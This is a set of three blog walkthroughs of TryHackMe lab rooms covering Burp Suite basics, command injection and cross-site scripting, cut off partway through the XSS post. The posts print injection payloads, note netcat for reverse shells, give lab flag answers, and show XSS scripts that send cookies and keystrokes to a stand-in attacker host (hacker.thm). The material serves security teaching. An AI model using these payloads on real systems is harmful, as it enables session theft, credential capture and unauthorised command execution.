[{"id":"47b6d8287ac634ea0ec9f7574ea320b4","title":"BurpSuite: The Basics- THM","content":"Hello Hackers 💌Today we are gonna walkthrough a new room in Web Fundamentals called Content Discovery on #TryHackMeLets start 🚀\n\n  \n    View notes 👀\n  \n\n\nTASK 1 - IntroductionWelcome to Burp Suite Basics!This particular room aims to understand the basics of the Burp Suite web application security testing framework. Our focus will revolve around the following key aspects:\n\nA thorough introduction to Burp Suite.\nA comprehensive overview of the various tools available within the framework.\nDetailed guidance on the process of installing Burp Suite on your system.\nNavigating and configuring Burp Suite.\n\nWe will also introduce the core of the Burp Suite framework, which is the Burp Proxy. It is important to note that this room primarily serves as a foundational resource for acquiring knowledge about Burp Suite. Subsequent rooms in the Burp module will adopt a more practical approach. Thus, this room will contain a greater emphasis on theoretical content. If you have not yet utilised Burp Suite, it is recommended to carefully read the provided information and actively engage with the tool. Experimentation is essential for grasping the fundamentals of this framework. Combining the information presented here with hands-on exploration will establish a strong foundation for utilising the framework. This will significantly assist you in future rooms.\nTASK 2 - What is burp suite ?In essence, Burp Suite is a Java-based framework designed to serve as a comprehensive solution for conducting web application penetration testing. It has become the industry standard tool for hands-on security assessments of web and mobile applications, including those that rely on application programming interfaces (APIs).\nSimply put, Burp Suite captures and enables manipulation of all the HTTP&#x2F;HTTPS traffic between a browser and a web server. This fundamental capability forms the backbone of the framework. By intercepting requests, users have the flexibility to route them to various components within the Burp Suite framework, which we will explore in upcoming sections. The ability to intercept, view, and modify web requests before they reach the target server or even manipulate responses before they are received by our browser makes Burp Suite an invaluable tool for manual web application testing.\nBurp Suite is available in different editions. For our purposes, we will focus on the Burp Suite Community Edition, which is freely accessible for non-commercial use within legal boundaries. However, it’s worth noting that Burp Suite also offers Professional and Enterprise editions, which come with advanced features and require licensing:\n\nBurp Suite Professional is an unrestricted version of Burp Suite Community. It comes with features such as:\n\n  An automated vulnerability scanner.  A fuzzer&#x2F;brute-forcer that isn’t rate limited.  Saving projects for future use and report generation.  A built-in API to allow integration with other tools.  Unrestricted access to add new extensions for greater functionality.  Access to the Burp Suite Collaborator (effectively providing a unique request catcher self-hosted or running on a Portswigger-owned server).\nIn short, Burp Suite Professional is a highly potent tool, making it a preferred choice for professionals in the field.\n\nBurp Suite Enterprise, in contrast to the community and professional editions, is primarily utilized for continuous scanning. It features an automated scanner that periodically scans web applications for vulnerabilities, similar to how tools like Nessus perform automated infrastructure scanning. Unlike the other editions, which allow manual attacks from a local machine, Burp Suite Enterprise resides on a server and constantly scans the target web applications for potential vulnerabilities.\n\n\nDue to requiring a license for the Professional and Enterprise editions, we will focus on the core feature set provided by the Burp Suite Community Edition.\nNote: The provided demonstrations utilize Burp Suite for Windows. However, the functionality remains consistent with the version installed on the AttackBox.\nAnswer the questions below1. Which edition of Burp Suite runs on a server and provides constant scanning for target web apps?Answer: Burp Suite Enterprise\n2. Burp Suite is frequently used when attacking web applications and ______ applications.Answers: Mobile\nTASK 3 - Features of Burp CommunityAlthough Burp Suite Community offers a more limited feature set compared to the Professional edition, it still provides an impressive array of tools that are highly valuable for web application testing. Let’s explore some of the key features:\nProxy: The Burp Proxy is the most renowned aspect of Burp Suite. It enables interception and modification of requests and responses while interacting with web applications.Repeater: Another well-known feature. Repeater allows for capturing, modifying, and resending the same request multiple times. This functionality is particularly useful when crafting payloads through trial and error (e.g., in SQLi - Structured Query Language Injection) or testing the functionality of an endpoint for vulnerabilities.Intruder: Despite rate limitations in Burp Suite Community, Intruder allows for spraying endpoints with requests. It is commonly utilized for brute-force attacks or fuzzing endpoints.Decoder: Decoder offers a valuable service for data transformation. It can decode captured information or encode payloads before sending them to the target. While alternative services exist for this purpose, leveraging Decoder within Burp Suite can be highly efficient.Comparer: As the name suggests, Comparer enables the comparison of two pieces of data at either the word or byte level. While not exclusive to Burp Suite, the ability to send potentially large data segments directly to a comparison tool with a single keyboard shortcut significantly accelerates the process.Sequencer: Sequencer is typically employed when assessing the randomness of tokens, such as session cookie values or other supposedly randomly generated data. If the algorithm used for generating these values lacks secure randomness, it can expose avenues for devastating attacks.Beyond the built-in features, the Java codebase of Burp Suite facilitates the development of extensions to enhance the framework’s functionality. These extensions can be written in Java, Python (using the Java Jython interpreter), or Ruby (using the Java JRuby interpreter). The Burp Suite Extender module allows for quick and easy loading of extensions into the framework, while the marketplace, known as the BApp Store, enables downloading of third-party modules. While certain extensions may require a professional license for integration, there are still a considerable number of extensions available for Burp Community. For instance, the Logger++ module can extend the built-in logging functionality of Burp Suite.\nAnswer the questions below1. Which Burp Suite feature allows us to intercept requests between ourselves and the target?Answer: Proxy\n2. Which Burp tool would we use to brute-force a login form?Answer: Intruder\nTASK 4 - InstallationBurp Suite is one of those tools that is very useful to have around, whether for web or mobile application assessments, pentesting, bug bounty hunting, or even debugging features in web app development. Here’s a guide on installing Burp Suite on different platforms:\nNote: If you use the AttackBox, Burp Suite is already installed, so you can skip this step.\nDownloadsTo download the latest version of Burp Suite for other systems, you may click this button to go to their download page.\nKali Linux: Burp Suite comes pre-installed with Kali Linux. In case it is missing on your Kali installation, you can easily install it from the Kali apt repositories.\nLinux, macOS, and Windows: For other operating systems, PortSwigger provides dedicated installers for Burp Suite Community and Burp Suite Professional on the Burp Suite downloads page. Choose your operating system from the dropdown menu and select Burp Suite Community Edition. Then, click the Download button to initiate the download.\n\nInstallation\nInstall Burp Suite using the appropriate method for your operating system. On Windows, run the executable file, while on Linux, execute the script from the terminal (with or without sudo). If you choose not to use sudo during installation on Linux, Burp Suite will be installed in your home directory at ~/BurpSuiteCommunity/BurpSuiteCommunity and will not be added to your PATH.\nThe installation wizard provides clear instructions, and it is generally safe to accept the default settings. However, it is always recommended to review the installer carefully.\nWith Burp Suite successfully installed, you can now launch the application. In the next task, we will explore the initial setup and configuration.\nTASK 5 - The DashboardYou may use the pre-installed Burp Suite Community Edition in our AttackBox. To launch the AttackBox, click the Start AttackBox button at the top of this page.\nOnce you launch Burp Suite and accept the terms and conditions, you will be prompted to select a project type. In Burp Suite Community, the options are limited, and you can simply click Next to proceed.\nThe next window allows you to choose the configuration for Burp Suite. It is generally recommended to keep the default settings, which are suitable for most situations. Click Start Burp to open the main Burp Suite interface.\nUpon opening Burp Suite for the first time, you might encounter a screen with training options. It is highly recommended to go through these training materials when you have the time.\nIf you don’t see the training screen (or in subsequent sessions), you will be presented with the Burp Dashboard, which may seem overwhelming at first. However, it will soon become familiar.\nThe Burp Dashboard is divided into four quadrants, as labelled in counter-clockwise order starting from the top left:\n\nTasks: The Tasks menu allows you to define background tasks that Burp Suite will perform while you use the application. In Burp Suite Community, the default “Live Passive Crawl” task, which automatically logs the pages visited, is sufficient for our purposes in this module. Burp Suite Professional offers additional features like on-demand scans.\nEvent log: The Event log provides information about the actions performed by Burp Suite, such as starting the proxy, as well as details about connections made through Burp.\nIssue Activity: This section is specific to Burp Suite Professional. It displays the vulnerabilities identified by the automated scanner, ranked by severity and filterable based on the certainty of the vulnerability.\nAdvisory: The Advisory section provides more detailed information about the identified vulnerabilities, including references and suggested remediations. This information can be exported into a report. In Burp Suite Community, this section may not show any vulnerabilities.\nThroughout the various tabs and windows of Burp Suite, you will notice question mark icons (question mark icon).\nClicking on these icons opens a new window with helpful information specific to that section. These help icons are invaluable when you need assistance or clarification on a particular feature, so make sure to utilise them effectively.\nBy exploring the different tabs and functionalities of Burp Suite, you will gradually become familiar with its capabilities.\nAnswer the questions below1. What menu provides information about the actions performed by Burp Suite, such as starting the proxy, and details about connections made through Burp?Answer: Event log\nTASk 6 - NavigationIn Burp Suite, the default navigation is primarily done through the top menu bars, which allow you to switch between modules and access various sub-tabs within each module. The sub-tabs appear in a second menu bar directly below the main menu bar.\nHere’s how the navigation works:\nModule Selection: The top row of the menu bar displays the available modules in Burp Suite. You can click on each module to switch between them. For example, the Burp Proxy module is selected in the image below.\nSub-Tabs: If a selected module has multiple sub-tabs, they can be accessed through the second menu bar that appears directly below the main menu bar. These sub-tabs often contain module-specific settings and options. For example, in the image above, the Proxy Intercept sub-tab is selected within the Burp Proxy module.\nDetaching Tabs: If you prefer to view multiple tabs separately, you can detach them into separate windows. To do this, go to the Window option in the application menu above the Module Selection bar. From there, choose the “Detach” option, and the selected tab will open in a separate window. The detached tabs can be reattached using the same method.\n\nBurp Suite also provides keyboard shortcuts for quick navigation to key tabs. By default, the following shortcuts are available:\n\n\n\nShortcut\nTab\n\n\n\nCtrl + Shift + D\nDashboard\n\n\nCtrl + Shift + T\nTarget tab\n\n\nCtrl + Shift + P\nProxy tab\n\n\nCtrl + Shift + I\nIntruder tab\n\n\nCtrl + Shift + R\nRepeater tab\n\n\nAnswer the questions below1. Which tab Ctrl + Shift + P will switch us to?Answer: Proxy Tab\nTASk 7 - OptionsBefore diving into the Burp Proxy, let’s explore the available options for configuring Burp Suite. There are two types of settings: Global settings (also known as User settings) and Project settings.\nGlobal Settings: These settings affect the entire Burp Suite installation and are applied every time you start the application. They provide a baseline configuration for your Burp Suite environment.\nProject Settings: These settings are specific to the current project and apply only during the session. However, please note that Burp Suite Community Edition does not support saving projects, so any project-specific options will be lost when you close Burp.\nTo access the settings, click on the Settings button in the top navigation bar. This will open a separate settings window.\n\nBelow is the image showing the separate settings window.\n\nIn the Settings window, you will find a menu on the left-hand side. This menu allows you to switch between different types of settings, including:\n1. Search: Enables searching for specific settings using keywords.2. Type filter: Filters the settings for User and Project options.\n\nUser settings: Shows settings that affect the entire Burp Suite installation.\nProject settings: Displays settings specific to the current project.\n\n3. Categories: Allows selecting settings by category.\n\nIt’s worth noting that many tools within Burp Suite provide shortcuts to specific categories of settings. For example, the Proxy module includes a Proxy settings button that opens the settings window directly to the relevant proxy section.\n\nThe search feature on the settings page is a valuable addition, allowing you to quickly search for settings using keywords.\nTake some time to familiarise yourself with the range of configurable options in Burp Suite. Once you are comfortable, you can proceed with the exercises related to configuring Burp Suite settings.\nAnswer the questions below1. In which category can you find a reference to a “Cookie jar”?Answer: Sessions\n2. In which base category can you find the “Updates” sub-category, which controls the Burp Suite update behaviour?Answer: Suite\n3. What is the name of the sub-category which allows you to change the keybindings for shortcuts in Burp Suite?Answer: Hotkeys\n4. If we have uploaded Client-Side TLS certificates, can we override these on a per-project basis (yea&#x2F;nay)?Answer: yea\nTASK 8 - Introduction to the Burp ProxyThe Burp Proxy is a fundamental and crucial tool within Burp Suite. It enables the capture of requests and responses between the user and the target web server. This intercepted traffic can be manipulated, sent to other tools for further processing, or explicitly allowed to continue to its destination.\nKey Points to Understand About the Burp Proxy\n\nIntercepting Requests: When requests are made through the Burp Proxy, they are intercepted and held back from reaching the target server. The requests appear in the Proxy tab, allowing for further actions such as forwarding, dropping, editing, or sending them to other Burp modules. To disable the intercept and allow requests to pass through the proxy without interruption, click the Intercept is on button.\n\n\n\nTaking Control: The ability to intercept requests empowers testers to gain complete control over web traffic, making it invaluable for testing web applications.\n\nCapture and Logging: Burp Suite captures and logs requests made through the proxy by default, even when the interception is turned off. This logging functionality can be helpful for later analysis and review of prior requests.\n\nWebSocket Support: Burp Suite also captures and logs WebSocket communication, providing additional assistance when analysing web applications.\n\nLogs and History: The captured requests can be viewed in the HTTP history and WebSockets history sub-tabs, allowing for retrospective analysis and sending the requests to other Burp modules as needed.\n\n\n\nProxy-specific options can be accessed by clicking the Proxy settings button. These options provide extensive control over the Proxy’s behaviour and functionality. Familiarise yourself with these options to optimize your Burp Proxy usage.\nSome Notable Features in the Proxy Settings\n\nResponse Interception: By default, the proxy does not intercept server responses unless explicitly requested on a per-request basis. The “Intercept responses based on the following rules” checkbox, along with the defined rules, allows for a more flexible response interception.\n\n\n\nMatch and Replace: The “Match and Replace” section in the Proxy settings enables the use of regular expressions (regex) to modify incoming and outgoing requests. This feature allows for dynamic changes, such as modifying the user agent or manipulating cookies.\n\nTake the time to explore and experiment with the Proxy options, as this will enhance your understanding and proficiency with the tool.\nTASK 9 - Connecting through the Proxy (FoxyProxy)","slug":"THM/WEB/BurpSuite-The-Basics-THM","date":"2024-06-12T14:14:18.000Z","categories_index":"cybersecurity,THM,web,Burp Suite","tags_index":"tryhackme,web,burpsuite","author_index":"Satvik"},{"id":"ddce70539670cb4101c9771354514bae","title":"Command Injection - THM","content":"Hello Hackers 💌Today we are gonna walkthrough a new room in Web Fundamentals called Command Injection on #TryHackMeLets start 🚀\n\n  \n    View notes 👀\n  \n\n\n\nTASK 1 - Introduction\nIn this room, we’re going to be covering the web vulnerability that is command injection. Once we understand what this vulnerability is, we will then showcase its impact and the risk it imposes on an application.\nThen, you’re going to be able to put this knowledge into practice, namely:\n\nHow to discover the command injection vulnerability\nHow to test and exploit this vulnerability using payloads designed for different operating systems\nHow to prevent this vulnerability in an application\nLastly, you’ll get to apply theory into practice learning in a practical at the end of the room.\n\nTo begin with, let’s first understand what command injection is. Command injection is the abuse of an application’s behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with. For example, achieving command injection on a web server running as a user named joe will execute commands under this joe user - and therefore obtain any permissions that joe has.\nCommand injection is also often known as “Remote Code Execution” (RCE) because of the ability to remotely execute code within an application. These vulnerabilities are often the most lucrative to an attacker because it means that the attacker can directly interact with the vulnerable system. For example, an attacker may read system or user files, data, and things of that nature.\nFor example, being able to abuse an application to perform the command whoami to list what user account the application is running will be an example of command injection.\nCommand injection was one of the top ten vulnerabilities reported by Contrast Security’s AppSec intelligence report in 2019. (Contrast Security AppSec., 2019). Moreover, the OWASP framework constantly proposes vulnerabilities of this nature as one of the top ten vulnerabilities of a web application (OWASP framework).\nTASK 2 - Discovering Command InjectionThis vulnerability exists because applications often use functions in programming languages such as PHP, Python and NodeJS to pass data to and to make system calls on the machine’s operating system. For example, taking input from a field and searching for an entry into a file. Take this code snippet below as an example:\nIn this code snippet, the application takes data that a user enters in an input field named $title to search a directory for a song title. Let’s break this down into a few simple steps.\n\n\nThe application stores MP3 files in a directory contained on the operating system.\n\nThe user inputs the song title they wish to search for. The application stores this input into the $title variable.\n\nThe data within this $title variable is passed to the command grep to search a text file named songtitle.txt for the entry of whatever the user wishes to search for.\n\nThe output of this search of songtitle.txt will determine whether the application informs the user that the song exists or not.\n\n\nNow, this sort of information would typically be stored in a database; however, this is just an example of where an application takes input from a user to interact with the application’s operating system.\nAn attacker could abuse this application by injecting their own commands for the application to execute. Rather than using grep to search for an entry in songtitle.txt, they could ask the application to read data from a more sensitive file.\nAbusing applications in this way can be possible no matter the programming language the application uses. As long as the application processes and executes it, it can result in command injection. For example, this code snippet below is an application written in Python.\n\nNote, you are not expected to understand the syntax behind these applications. However, for the sake of reason, I have outlined the steps of how this Python application works as well.\nThe “flask” package is used to set up a web serverA function that uses the “subprocess” package to execute a command on the deviceWe use a route in the webserver that will execute whatever is provided. For example, to execute whoami, we’d need to visit http://flaskapp.thm/whoami\nAnswer the questions below1. What variable stores the user’s input in the PHP code snippet in this task?Answer: $title\n2. What HTTP method is used to retrieve data submitted by a user in the PHP code snippet?Answer: GET\n3. If I wanted to execute the id command in the Python code snippet, what route would I need to visit?Answer: /id\nTASK 3 - Exploiting Command InjectionUnderstanding Command Injection in Web Applications\nYou can often determine whether or not command injection may occur by the behaviors of an application, as you will come to see in the practical session of this room.\nApplications that use user input to populate system commands with data can often be combined in unintended behaviors. For example, the shell operators ;, &amp;, and &amp;&amp; will combine two (or more) system commands and execute them both. If you are unfamiliar with this concept, it is worth checking out the Linux fundamentals module to learn more about this.\nCommand Injection can be detected in mostly one of two ways:\n\nBlind command injection\nVerbose command injection\n\nI have defined these two methods in the table below, where the two sections underneath will explain these in greater detail.\n\n\n\nMethod\nDescription\n\n\n\nBlind\nThis type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviors of the application to determine whether or not your payload was successful.\n\n\nVerbose\nThis type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the whoami command to see what user the application is running under. The web application will output the username on the page directly.\n\n\nDetecting Blind Command Injection\nBlind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable. For example, a command is executed, but the web application outputs no message.\nFor this type of command injection, we will need to use payloads that will cause some time delay. For example, the ping and sleep commands are significant payloads to test with. Using ping as an example, the application will hang for x seconds in relation to how many pings you have specified.\nAnother method of detecting blind command injection is by forcing some output. This can be done by using redirection operators such as &gt;. If you are unfamiliar with this, I recommend checking out the Linux fundamentals module. For example, we can tell the web application to execute commands such as whoami and redirect that to a file. We can then use a command such as cat to read this newly created file’s contents.\nTesting command injection this way is often complicated and requires quite a bit of experimentation, significantly as the syntax for commands varies between Linux and Windows.\nThe curl command is a great way to test for command injection. This is because you are able to use curl to deliver data to and from an application in your payload. Take this code snippet below as an example, a simple curl payload to an application is possible for command injection.\n1curl http://vulnerable.app/process.php?search=The%20Beatles;%20whoami\n\nDetecting Verbose Command Injection\nDetecting command injection this way is arguably the easiest method of the two. Verbose command injection is when the application gives you feedback or output as to what is happening or being executed.\nFor example, the output of commands such as ping or whoami is directly displayed on the web application.\nUseful Payloads\nI have compiled some valuable payloads for both Linux &amp; Windows into the tables below.\nLinux\n\n\n\nPayload\nDescription\n\n\n\nwhoami\nSee what user the application is running under.\n\n\nls\nList the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.\n\n\nping\nThis command will invoke the application to hang. This will be useful in testing an application for blind command injection.\n\n\nsleep\nThis is another useful payload in testing an application for blind command injection, where the machine does not have ping installed.\n\n\nnc\nNetcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges.\n\n\nWindows\n\n\n\nPayload\nDescription\n\n\n\nwhoami\nSee what user the application is running under.\n\n\ndir\nList the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.\n\n\nping\nThis command will invoke the application to hang. This will be useful in testing an application for blind command injection.\n\n\ntimeout\nThis command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the ping command is not installed.\n\n\nAnswer the questions below1. What payload would I use if I wanted to determine what user the application is running as?Answer: whoami\n2. What popular network tool would I use to test for blind command injection on a Linux machine?Answer: ping\n3. What payload would I use to test a Windows machine for blind command injection?Answer: timeout\nTASK 4 - Remediating Command InjectionCommand injection can be prevented in a variety of ways. Everything from minimal use of potentially dangerous functions or libraries in a programming language to filtering input without relying on a user’s input. I have detailed these a bit further below. The examples below are of the PHP programming language; however, the same principles can be extended to many other languages.\nVulnerable Functions\nIn PHP, many functions interact with the operating system to execute commands via shell; these include:\n\nExec\nPassthru\nSystem\n\nTake this snippet below as an example. Here, the application will only accept and process numbers that are inputted into the form. This means that any commands such as whoami will not be processed.\n\n\nThe application will only accept a specific pattern of characters (the digits  0-9)\nThe application will then only proceed to execute this data which is all numerical.\n\nThese functions take input such as a string or user data and will execute whatever is provided on the system. Any application that uses these functions without proper checks will be vulnerable to command injection.\nInput sanitisation\nSanitising any input from a user that an application uses is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit. For example, an input field that only accepts numerical data or removes any special characters such as &gt; ,  &amp; and /.\nIn the snippet below, the filter_input PHP function is used to check whether or not any data submitted via an input form is a number or not. If it is not a number, it must be invalid input.\n\nBypassing Filters\nApplications will employ numerous techniques in filtering and sanitising data that is taken from a  user’s input. These filters will restrict you to specific payloads; however, we can abuse the logic behind an application to bypass these filters. For example, an application may strip out quotation marks; we can instead use the hexadecimal value of this to achieve the same result.\nWhen executed, although the data given will be in a different format than what is expected, it can still be interpreted and will have the same result.\n\nAnswer the questions below1. What is the term for the process of “cleaning” user input that is provided to an application?Answer: sanitisation\nTASK 5 - Practical: Command Injection (Deploy)Deploy the machine attached to this task; it will be visible in the split-screen view once it is ready.\n\nTest some payloads on the application hosted on the website visible in split-screen view to test for command injection. Refer to this cheat sheet if you are stuck or wish to explore some more complex payloads.\nFind the contents of the flag located in &#x2F;home&#x2F;tryhackme&#x2F;flag.txt. You can use a variety of payloads to achieve this – I recommend trying multiple.\nAnswer the questions below1. What user is this application running as?Enter the command : &amp; whoami\nAnswer: www-data\n2. What are the contents of the flag located in &#x2F;home&#x2F;tryhackme&#x2F;flag.txt?Enter the command :  &amp; cat /home/tryhackme/flag.txt\nANswer: THM&#123;COMMAND_INJECTION_COMPLETE&#125;\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/Command-Injection-THM","date":"2024-06-09T16:37:06.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"a4a70e8c6575b56163e1d8803d527b20","title":"Intro to Cross Site Scripting","content":"Hello Hackers 💌Today we are gonna walkthrough a new room in Web Fundamentals called Intro to Cross site Scripting on #TryHackMeLets start 🚀\n\n  \n    View notes 👀\n  \n\n\nTASK 1 - Room BriefPrerequisites:It’s worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicated—also, a basic understanding of Client-Server requests and responses.\nCross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you’ll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.\nCross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.  \nXSS found in Shopify$7,500 for XSS found in Steam chat$2,500 for XSS in HackerOneXSS found in Infogram\nAnswer the following Questions1. What does XSS stand for?Answer: Cross-site scripting\nTASK 2 - XSS PayloadsWhat is a payload?\nIn XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.\nThe intention is what you wish the JavaScript to actually do (which we’ll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).\nHere are some examples of XSS intentions.\nProof Of Concept:\nThis is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:\n&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;\nSession Stealing:\nDetails of a user’s session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target’s cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker’s control to be logged. Once the hacker has these cookies, they can take over the target’s session and be logged as that user.\n&lt;script&gt;fetch(&#39;https://hacker.thm/steal?cookie=&#39; + btoa(document.cookie));&lt;/script&gt;\nKey Logger:\nThe below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker’s control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.\n&lt;script&gt;document.onkeypress = function(e) &#123; fetch(&#39;https://hacker.thm/log?key=&#39; + btoa(e.key) );&#125;&lt;/script&gt;\nBusiness Logic:\nThis payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user’s email address called user.changeEmail(). Your payload could look like this:\n&lt;script&gt;user.changeEmail(&#39;attacker@hacker.thm&#39;);&lt;/script&gt;\nNow that the email address for the account has changed, the attacker may perform a reset password attack.\nThe next four tasks are going to cover the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction.\nAnswer the questions below1. Which document property could contain the user’s session token?aNSWER: document.cookie\n2. Which JavaScript method is often used as a Proof Of Concept?aNSWER: alert\nTASK 3 - Reflected XSSReflected XSS\nReflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.\nExample Scenario:\nA website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.\n\nThe application doesn’t check the contents of the error parameter, which allows the attacker to insert malicious code.\n\nThe vulnerability can be used as per the scenario in the image below:\n\nPotential Impact:\nThe attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.\nHow to test for Reflected XSS:\nYou’ll need to test every possible point of entry; these include:\n\nParameters in the URL Query String\nURL File Path\nSometimes HTTP Headers (although unlikely exploitable in practice)Once you’ve found some data which is being reflected in the web application, you’ll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you’ll learn more about this in task 6).\n\nAnswer the questions below1. Where in an URL is a good place to test for reflected XSS?aNSWER: parameters\nTASK 4 - Stored XSSstored xss\nAs the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.\nExample Scenario:\nA blog website that allows users to post comments. Unfortunately, these comments aren’t checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.\n\nPotential Impact:\nThe malicious JavaScript could redirect users to another site, steal the user’s session cookie, or perform other website actions while acting as the visiting user.\nHow to test for Stored XSS:\nYou’ll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:\n\nComments on a blog\nUser profile information\nWebsite ListingsSometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn’t be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.\n\nOnce you’ve found some data which is being stored in the web application,  you’ll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you’ll learn more about this in task 6).\nAnswer the questions below1. How are stored XSS payloads usually stored on a website?Answer: database\nTASK 5 - DOM based XSSDOM Based XSS\nWhat is the DOM?\nDOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:\n\nIf you want to learn more about the DOM and gain a deeper understanding w3.org have a great resource.\nExploiting the DOM\nDOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.\nExample Scenario:\nThe website’s JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren’t checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.\nPotential Impact:\nCrafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user’s session.\nHow to test for Dom Based XSS:\nDOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You’d need to look for parts of the code that access certain variables that an attacker can have control over, such as “window.location.x” parameters.\nWhen you’ve found those bits of code, you’d then need to see how they are handled and whether the values are ever written to the web page’s DOM or passed to unsafe JavaScript methods such as eval().\nAnswer the questions below1. What unsafe JavaScript method is good to look for in source code?Answer: eval()\nTASK 6 - Blind XSSBlind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can’t see the payload working or be able to test it against yourself first.\nExample Scenario:\nA website has a contact form where you can message a member of staff. The message content doesn’t get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.\nPotential Impact:\nUsing the correct payload, the attacker’s JavaScript could make calls back to an attacker’s website, revealing the staff portal URL, the staff member’s cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member’s session and have access to the private portal\nHow to test for Blind XSS:\nWhen testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.\nA popular tool for Blind XSS attacks is XSS Hunter Express. Although it’s possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.\nAnswer the questions below1. What tool can you use to test for Blind XSS?Answer: XSS Hunter Express\n2. What type of XSS is very similar to Blind XSS?Answer: Stored XSS\nTASK 7 - Perfecting your payloadThe payload is the JavaScript code we want to execute either on another user’s browser or as a proof of concept to demonstrate a vulnerability in a website.\nYour payload could have many intentions, from just bringing up a JavaScript alert box to prove we can execute JavaScript on the target website to extracting information from the webpage or user’s session.\nHow your JavaScript payload gets reflected in a target website’s code will determine the payload you need to use. To Explain this, click the green Start Machine button on the right, and when the machine has loaded, open the below link in a new tab.\nhttps://LAB_WEB_URL.p.thmlabs.com\nThe aim for each level will be to execute the JavaScript alert function with the string THM, for example:\n&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;\nLevel One:\nYou’re presented with a form asking you to enter your name, and once you’ve entered your name, it will be presented on a line below, for example:\n\nIf you view the Page Source, You’ll see your name reflected in the code:\n\nInstead of entering your name, we’re instead going to try entering the following JavaScript Payload: &lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;\nNow when you click the enter button, you’ll get an alert popup with the string THM and the page source will look like the following:\n\nAnd then, you’ll get a confirmation message that your payload was successful with a link to the next level.\nLevel Two:\nLike the previous level, you’re being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:\n\nViewing the page source, you can see your name reflected inside the value attribute of the input tag:\n\nIt wouldn’t work if you were to try the previous JavaScript payload because you can’t run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload: &quot;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;\nThe important part of the payload is the “&gt; which closes the value parameter and then closes the input tag.\nThis now closes the input tag properly and allows the JavaScript payload to run:\n\nNow when you click the enter button, you’ll get an alert popup with the string THM. And then, you’ll get a confirmation message that your payload was successful with a link to the next level.\nLevel Three:\nYou’re presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the textarea tag.\n\nWe’ll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: &lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;\nThis turns this:\n\nInto This:\n\nThe important part of the above payload is &lt;/textarea&gt;, which causes the textarea element to close so the script will run.\nNow when you click the enter button, you’ll get an alert popup with the string THM. And then, you’ll get a confirmation message that your payload was successful with a link to the next level.\nLevel Four:\nEntering your name into the form, you’ll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you’ll see your name gets reflected in some JavaScript 